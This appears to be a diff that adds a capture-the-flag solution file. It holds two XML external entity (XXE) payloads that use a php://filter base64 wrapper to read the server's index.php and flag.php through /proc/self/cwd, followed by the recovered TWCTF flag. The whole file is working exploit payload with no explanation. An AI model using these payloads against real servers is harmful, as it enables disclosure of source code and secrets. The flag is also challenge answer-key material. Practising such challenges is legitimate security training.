@@ -1,0 +1,20 @@
+<?xml version="1.0"?>
+ <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/proc/self/cwd/index.php" >]>
+<root>
+    <foo>&xxe;</foo>
+</root>
+
+
+
+<?xml version="1.0"?>
+ <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/proc/self/cwd/flag.php" >]>
+<root>
+    <foo>&xxe;</foo>
+</root>
+
+
+TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}
